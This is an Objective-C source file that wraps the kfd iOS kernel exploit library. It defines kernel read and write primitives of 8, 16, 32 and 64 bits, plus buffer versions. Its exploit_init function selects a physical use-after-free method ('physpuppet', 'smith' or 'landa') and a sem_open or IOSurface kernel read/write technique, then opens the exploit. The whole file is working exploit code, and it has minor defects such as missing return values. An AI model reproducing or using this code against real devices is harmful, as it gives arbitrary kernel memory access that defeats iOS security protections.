#import "kfd/kfd/libkfd.h"

uint64_t gKfd = 0;

uint8_t kread8(uint64_t where) {
    uint8_t out;
    kread(gKfd, where, &out, sizeof(uint8_t));
    return out;
}
uint32_t kread16(uint64_t where) {
    uint16_t out;
    kread(gKfd, where, &out, sizeof(uint16_t));
    return out;
}
uint32_t kread32(uint64_t where) {
    uint32_t out;
    kread(gKfd, where, &out, sizeof(uint32_t));
    return out;
}
uint64_t kread64(uint64_t where) {
    uint64_t out;
    kread(gKfd, where, &out, sizeof(uint64_t));
    return out;
}

void kwrite8(uint64_t where, uint8_t what) {
    uint8_t _buf[8] = {};
    _buf[0] = what;
    _buf[1] = kread8(where+1);
    _buf[2] = kread8(where+2);
    _buf[3] = kread8(where+3);
    _buf[4] = kread8(where+4);
    _buf[5] = kread8(where+5);
    _buf[6] = kread8(where+6);
    _buf[7] = kread8(where+7);
    kwrite((u64)(gKfd), &_buf, where, sizeof(u64));
}

void kwrite16(uint64_t where, uint16_t what) {
    u16 _buf[4] = {};
    _buf[0] = what;
    _buf[1] = kread16(where+2);
    _buf[2] = kread16(where+4);
    _buf[3] = kread16(where+6);
    kwrite((u64)(gKfd), &_buf, where, sizeof(u64));
}

void kwrite32(uint64_t where, uint32_t what) {
    u32 _buf[2] = {};
    _buf[0] = what;
    _buf[1] = kread32(where+4);
    kwrite((u64)(gKfd), &_buf, where, sizeof(u64));
}
void kwrite64(uint64_t where, uint64_t what) {
    u64 _buf[1] = {};
    _buf[0] = what;
    kwrite((u64)(gKfd), &_buf, where, sizeof(u64));
}

int kreadbuf(uint64_t where, void *buf, size_t size)
{
    if (size == 1) {
        *(uint8_t*)buf = kread8(where);
    }
    else if (size == 2) {
        *(uint16_t*)buf = kread16(where);
    }
    else if (size == 4) {
        *(uint32_t*)buf = kread32(where);
    }
    else {
        if (size >= UINT16_MAX) {
            for (uint64_t start = 0; start < size; start += UINT16_MAX) {
                uint64_t sizeToUse = UINT16_MAX;
                if (start + sizeToUse > size) {
                    sizeToUse = (size - start);
                }
                kread((u64)(gKfd), where+start, ((uint8_t *)buf)+start, sizeToUse);
            }
        } else {
            kread((u64)(gKfd), where, buf, size);
        }
    }
    return 0;
}

int kwritebuf(uint64_t where, const void *buf, size_t size)
{
    if (size == 1) {
        kwrite8(where, *(uint8_t*)buf);
    }
    else if (size == 2) {
        kwrite16(where, *(uint16_t*)buf);
    }
    else if (size == 4) {
        kwrite32(where, *(uint32_t*)buf);
    }
    else {
        if (size >= UINT16_MAX) {
            for (uint64_t start = 0; start < size; start += UINT16_MAX) {
                uint64_t sizeToUse = UINT16_MAX;
                if (start + sizeToUse > size) {
                    sizeToUse = (size - start);
                }
                kwrite((u64)(gKfd), (void*)((uint8_t *)buf)+start, where+start, sizeToUse);
            }
        } else {
            kwrite((u64)(gKfd), (void*)buf, where, size);
        }
    }
    return 0;
}

int exploit_init(const char *flavour)
{
    u64 method = 0;
    if (!strcmp(flavour, "physpuppet")) {
        method = puaf_physpuppet;
    }
    else if(!strcmp(flavour, "smith")) {
        method = puaf_smith;
    }
    else if (!strcmp(flavour, "landa")) {
        method = puaf_landa;
    }
    else {
        return -1;
    }

    u64 kread_method = 0, kwrite_method = 0;
    if (@available(iOS 16.0, *)) {
        kread_method = kread_sem_open;
        kwrite_method = kwrite_sem_open;
    }
    else {
        kread_method = kread_IOSurface;
        kwrite_method = kwrite_IOSurface;
    }

    gKfd = kopen(2048, method, kread_method, kwrite_method);
}

int exploit_deinit(void)
{
    if (!gKfd) return -1;
    kclose(gKfd);
}